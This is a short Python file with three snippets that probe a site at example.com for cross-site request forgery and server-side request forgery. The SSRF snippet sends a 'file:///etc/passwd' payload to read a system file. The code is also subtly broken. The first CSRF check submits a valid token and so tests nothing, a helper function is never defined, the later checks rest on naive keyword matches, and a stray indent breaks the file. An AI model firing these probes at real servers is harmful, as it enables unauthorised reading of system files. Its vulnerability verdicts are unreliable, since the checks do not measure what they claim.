import requests

target_url = "http://example.com/form"

# send GET request to retrieve a CSRF token from the website
response = requests.get(target_url)

# extract the CSRF token from the response
csrf_token = extract_csrf_token(response.text)

# send a POST request with the extracted CSRF token
data = {"csrf_token": csrf_token, "field1": "value1", "field2": "value2"}
response = requests.post(target_url, data=data)

# check the response to see if the request was executed without user consent
if response.status_code == 200:
    print("The website is vulnerable to CSRF.")
else:
    print("The website is not vulnerable to CSRF.")

import requests

target_url = "http://example.com/form"

# send GET request with a malicious URL as a parameter
data = {"url": "file:///etc/passwd"}
response = requests.get(target_url, params=data)

# check the response to see if the server accessed the malicious URL
if response.status_code == 200 and "root:" in response.text:
    print("The website is vulnerable to SSRF.")
else:
    print("The website is not vulnerable to SSRF.")
    
 import requests

target_urls = [
    "http://example.com/change_password",
    "http://example.com/upload_file",
    # ...
]

for target_url in target_urls:
    # Check for CSRF vulnerabilities
    response = requests.get(target_url)
    if "CSRF" not in response.text and "token" not in response.text:
        print(f"{target_url} is vulnerable to CSRF.")

    # Check for SSRF vulnerabilities
    response = requests.get(target_url, params={"url": "http://127.0.0.1"})
    if "localhost" in response.text:
        print(f"{target_url} is vulnerable to SSRF.")

